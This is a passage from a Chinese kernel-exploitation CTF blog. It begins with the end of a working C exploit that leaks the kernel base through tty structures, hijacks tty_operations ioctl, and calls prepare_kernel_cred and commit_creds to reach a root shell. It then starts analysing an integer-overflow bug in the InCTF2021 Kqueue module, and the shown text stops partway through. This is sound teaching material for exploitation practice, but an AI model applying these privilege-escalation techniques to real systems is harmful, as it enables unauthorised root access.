class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    <span class="hljs-comment">// get kernel base</span><br>    tty_ops = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-keyword">void</span>*) ((<span class="hljs-keyword">size_t</span>)kernel_base + kernel_offset);<br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m%p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] work_for_cpu_fn: \033[0m%p\n&quot;</span>, WORK_FOR_CPU_FN + kernel_offset);<br><br>    <span class="hljs-comment">// find available note as fake tty_ops and fake stack</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-keyword">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;Unable to find enough available notes, you\&#x27;re so lucky that you got so many tty_structs.&quot;</span>);<br><br>    <span class="hljs-comment">// adjust the size of the object</span><br>    noteEdit(fake_tty_ops_idx, <span class="hljs-keyword">sizeof</span>(struct tty_operations), fake_tty_data);<br>    noteGift((<span class="hljs-keyword">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br><br>    <span class="hljs-comment">// hijack the ioctl</span><br>    ((struct tty_operations *)fake_tty_ops_data)-&gt;ioctl = WORK_FOR_CPU_FN + kernel_offset;<br>    write(note_fd, fake_tty_ops_data, fake_tty_ops_idx);<br><br>    <span class="hljs-comment">/* ---- prepare_kernel_cred(NULL) ----*/</span><br><br>    <span class="hljs-comment">// store tty_struct data</span><br>    read(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>) * <span class="hljs-number">0x200</span>);<br><br>    <span class="hljs-comment">// set params in fake tty_struct</span><br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = prepare_kernel_cred;<br>    fake_tty_data[<span class="hljs-number">5</span>] = <span class="hljs-literal">NULL</span>;<br>    write(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">// exploit</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start prepare_kernel_cred(NULL)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        ioctl(tty_fd[i], <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* ---- commit_creds(ROOT) ----*/</span>getchar();<br><br>    <span class="hljs-comment">// get root cred back</span><br>    read(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">// restore tty_struct data</span><br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>) * <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment">// set params in fake tty_struct</span><br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = commit_creds;<br>    fake_tty_data[<span class="hljs-number">5</span>] = fake_tty_data[<span class="hljs-number">6</span>];<br>    fake_tty_data[<span class="hljs-number">6</span>] = tty_data[<span class="hljs-number">6</span>];<br>    write(note_fd, fake_tty_data, tty_idx);<br><br>    <span class="hljs-comment">// exploit</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start commit_creds(ROOT)...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        ioctl(tty_fd[i], <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[*] Done.\033[0m&quot;</span>);<br><br>    getRootShell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行即可提权到 root</p><p><a href="https://i.loli.net/2021/09/10/MKc5AXx9YwQzneU.png"><img src="https://s2.loli.net/2023/02/06/HREa2XWiDAPuVNs.png" alt="image.png"></a></p><h3 id="解法三：userfaultfd-kernel-UAF-hijack-modprobe-path"><a href="#解法三：userfaultfd-kernel-UAF-hijack-modprobe-path" class="headerlink" title="解法三：userfaultfd + kernel UAF + hijack modprobe_path"></a>解法三：userfaultfd + kernel UAF + hijack modprobe_path</h3><blockquote><p>To be 🕊🕊🕊…</p></blockquote><h1 id="Kernel-Heap-Heap-Overflow"><a href="#Kernel-Heap-Heap-Overflow" class="headerlink" title="Kernel Heap - Heap Overflow"></a>Kernel Heap - Heap Overflow</h1><p><strong>溢出</strong>（Overflow）向来都是最为经典、也是最为常见的一种漏洞，此前我们已经接触了位于内核栈上的溢出漏洞，接下来我们将开始进入内核动态内存区上的世界</p><h2 id="例题：InCTF2021-Kqueue"><a href="#例题：InCTF2021-Kqueue" class="headerlink" title="例题：InCTF2021 - Kqueue"></a>例题：InCTF2021 - Kqueue</h2><blockquote><p>据说 InCTF 国际赛为印度的“强网杯”…</p><p>原题下载地址在<a href="https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/Kqueue">这里</a>，本篇 wp 参照了 <a href="https://bbs.pediy.com/thread-269031.htm">Scupax0s 师傅的 WP</a></p><p>这道题的文件系统用 Buildroot 进行构建，<strong>登入用户名为 ctf，密码为 kqueue</strong>，笔者找了半天才在官方 GitHub 里的 Admin 中打远程用的脚本找到的这个信息…</p><p>还有个原因不明的问题，本地重打包后<strong>运行根目录下 init 时的 euid 为 1000</strong>，笔者只好拉一个别的 kernel pwn 的文件系统过来暂时顶用…</p></blockquote><h3 id="保护分析"><a href="#保护分析" class="headerlink" title="保护分析"></a>保护分析</h3><p>查看启动脚本，只开启了 kaslr 保护，没开 KPTI 也没开 smap&amp;smep，还是给了我们 ret2usr 的机会的</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">exec</span> qemu-system-x86_64 \<br>    -cpu kvm64 \<br>    -m 512 \<br>    -nographic \<br>    -kernel <span class="hljs-string">&quot;bzImage&quot;</span> \<br>    -append <span class="hljs-string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \<br>    -monitor /dev/null \<br>    -initrd <span class="hljs-string">&quot;./rootfs.cpio&quot;</span> \<br>    -net user \<br>    -net nic<br></code></pre></div></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>题目给出了源代码，免去了我们逆向的麻烦</p><blockquote><p>但有的时候给出源码反而会增大解题难度，比如说 *CTF2021 的 babygame <del>C++ PWN能不能爪巴</del></p></blockquote><p>在 <code>kqueue.h</code> 中只定义了一个 ioctl 函数</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">kqueue_ioctl</span><span class="hljs-params">(struct file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span>;<br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">kqueue_fops</span> =</span> &#123;.unlocked_ioctl = kqueue_ioctl&#125;;<br></code></pre></div></td></tr></table></figure><p>ioctl 的函数定义位于 <code>kqueue.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">kqueue_ioctl</span><span class="hljs-params">(struct file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span>&#123;<br><br>    <span class="hljs-keyword">long</span> result;<br><br>    <span class="hljs-keyword">request_t</span> request;<br><br>    mutex_lock(&amp;operations_lock);<br><br>    <span class="hljs-keyword">if</span> (copy_from_user((<span class="hljs-keyword">void</span> *)&amp;request, (<span class="hljs-keyword">void</span> *)arg, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">request_t</span>)))&#123;<br>        err(<span class="hljs-string">&quot;[-] copy_from_user failed&quot;</span>);<br>        <span class="hljs-keyword">goto</span> ret;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span>(cmd)&#123;<br>        <span class="hljs-keyword">case</span> CREATE_KQUEUE:<br>            result = create_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DELETE_KQUEUE:<br>            result = delete_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> EDIT_KQUEUE:<br>            result = edit_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SAVE:<br>            result = save_kqueue_entries(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            result = INVALID;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>ret: <br>    mutex_unlock(&amp;operations_lock);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们要传入的结构体应当为 <code>request_t</code> 类型，如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-keyword">uint32_t</span> max_entries;<br>    <span class="hljs-keyword">uint16_t</span> data_size;<br>    <span class="hljs-keyword">uint16_t</span> entry_idx;<br>    <span class="hljs-keyword">uint16_t</span> queue_idx;<br>    <span class="hljs-keyword">char</span>* data;<br>&#125;<span class="hljs-keyword">request_t</span>;<br></code></pre></div></td></tr></table></figure><p>在 ioctl 中定义了比较经典的增删改查操纵，下面逐个分析</p><h4 id="err"><a href="#err" class="headerlink" title="*err"></a>*<em>err</em></h4><p>笔者发现在其定义的一系列函数当中都有一系列的检查，若检查不通过则会调用 <code>err</code> 函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">err</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* msg)</span></span>&#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>也就是说<strong>所有的检查没有任何的实际意义，哪怕不通过检查也不会阻碍程序的运行</strong>，经笔者实测确乎如此</p><h4 id="create-kqueue"><a href="#create-kqueue" class="headerlink" title="create_kqueue"></a>create_kqueue</h4><p>主要是进行队列的创建，限制了队列数量与大小</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> noinline <span class="hljs-keyword">long</span> <span class="hljs-title">create_kqueue</span><span class="hljs-params">(<span class="hljs-keyword">request_t</span> request)</span></span>&#123;<br>    <span class="hljs-keyword">long</span> result = INVALID;<br><br>    <span class="hljs-keyword">if</span>(queueCount &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Max queue count reached&quot;</span>);<br><br>    <span class="hljs-comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span><br>    <span class="hljs-keyword">if</span>(request.max_entries&lt;<span class="hljs-number">1</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);<br><br>    <span class="hljs-comment">/* Asking for too much is also not good */</span><br>    <span class="hljs-keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)<br>        err(<span class="hljs-string">&quot;[-] kqueue data size exceed&quot;</span>);<br><br>    <span class="hljs-comment">/* Initialize kqueue_entry structure */</span><br>    queue_entry *kqueue_entry;<br><br>    <span class="hljs-comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span><br>    ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><br>    <span class="hljs-comment">/* Size is the size of queue structure + size of entry * request entries */</span><br>    ull queue_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><br>    <span class="hljs-comment">/* Total size should not exceed a certain limit */</span><br>    <span class="hljs-keyword">if</span>(queue_size&gt;<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>) + <span class="hljs-number">0x10000</span>)<br>        err(<span class="hljs-string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);<br><br>    <span class="hljs-comment">/* All checks done , now call kzalloc */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate((<span class="hljs-keyword">char</span> *)kmalloc(queue_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Main queue can also store data */</span><br>    <span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Fill the remaining queue structure */</span><br>    <span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br>    <span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br>    <span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br><br>    <span class="hljs-comment">/* Get to the place from where memory has to be handled */</span><br>    kqueue_entry = (queue_entry *)((<span class="hljs-keyword">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br><br>    <span class="hljs-comment">/* Allocate all kqueue entries */</span><br>    queue_entry* current_entry = kqueue_entry;<br>    queue_entry* prev_entry = current_entry;<br><br>    <span class="hljs-keyword">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-keyword">char</span> *)(validate((<span class="hljs-keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br><br>        <span class="hljs-comment">/* Increment current_entry by size of queue_entry */</span><br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br><br>        <span class="hljs-comment">/* Populate next pointer of the previous entry */</span><br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">/* Find an appropriate slot in kqueues */</span><br>    <span class="hljs-keyword">uint32_t</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>        <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br><br>    <span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>    kqueues[j] = <span class="hljs-built_in">queue</span>;<br>    queueCount++;<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>其中一个 queue 结构体定义如下，大小为 0x18：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-keyword">uint16_t</span> data_size;<br>    <span class="hljs-keyword">uint64_t</span> queue_size; <span class="hljs-comment">/* This needs to handle larger numbers */</span><br>    <span class="hljs-keyword">uint32_t</span> max_entries;<br>    <span class="hljs-keyword">uint16_t</span> idx;<br>    <span class="hljs-keyword">char</span>* data;<br>&#125;<span class="hljs-built_in">queue</span>;<br></code></pre></div></td></tr></table></figure><p>我们有一个全局指针数组保存分配的 queue</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="hljs-built_in">queue</span> *)<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></div></td></tr></table></figure><p>在这里用到了 <a href="https://gcc.gnu.org/onlinedocs/gcc/Integer-Overflow-Builtins.html">gcc 内置函数</a> <code>__builtin_umulll_overflow</code>，主要作用就是将前两个参数相乘给到第三个参数，发生溢出则返回 true，<code>__builtin_saddll_overflow</code> 与之类似不过是加法</p><p>那么这里虽然 queue 结构体的成员数量似乎是固定的，但是在 kmalloc 时传入的 size 为 <code>((request.max_entry + 1) * sizeof(queue_entry)) + sizeof(queue)</code>，其剩余的空间用作 queue_entry 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>    <span class="hljs-keyword">uint16_t</span> idx;<br>    <span class="hljs-keyword">char</span> *data;<br>    queue_entry *next;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>在这里存在一个<strong>整型溢出漏洞</strong>：如果在 <code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code> 中我们传入的 <code>request.max_entries</code> 为 <code>0xffffffff</code>，加一后变为0，此时便能通过检测，但 space 最终的结果为0，从而在后续进行 kmalloc 时便只分配了一个 queue 的大小，但是存放到 queue 的 max_entries 域的值为 <code>request.max_entries</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br><span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br><span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br></code></pre></div></td></tr></table></figure><p>这里有一个移动指针的代码看得笔者比较疑惑，因为在笔者看来可以直接写作 <code>(queue_entry *)(queue + 1)</code>，<del>不过阿三的代码懂的都懂</del></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">kqueue_entry = (queue_entry *)((<span class="hljs-keyword">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br></code></pre></div></td></tr></table></figure><p>在分配 queue-&gt;data 时给 kmalloc 传入的大小为 <code>request.data_size</code>，限制为 0x20</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br></code></pre></div></td></tr></table></figure><p>接下来会为每一个 queue_entry 的 data 域都分配一块内存，大小为 <code>request.data_size</code>，且 queue_entry 从低地址向高地址连接成一个单向链表</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-keyword">char</span> *)(validate((<span class="hljs-keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br><br>        <span class="hljs-comment">/* Increment current_entry by size of queue_entry */</span><br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br><br>        <span class="hljs-comment">/* Populate next pointer of the previous entry */</span><br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>在最后会在 kqueue 数组中找一个空的位置把分配的 queue 指针放进去</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">uint32_t</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>    <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>    err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br><br><span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>kqueues[j] = <span class="hljs-built_in">queue</span>;<br>queueCount++;<br>result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> result;<br></code></pre></div></td></tr></table></figure><h4 id="delete-kqueue"><a href="#delete-kqueue" class="headerlink" title="delete_kqueue"></a>delete_kqueue</h4><p>常规的删除功能，不过这里有个 bug 是先释放后再清零，笔者认为会把 free object 的next 指针给清掉，有可能导致内存泄漏？</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs 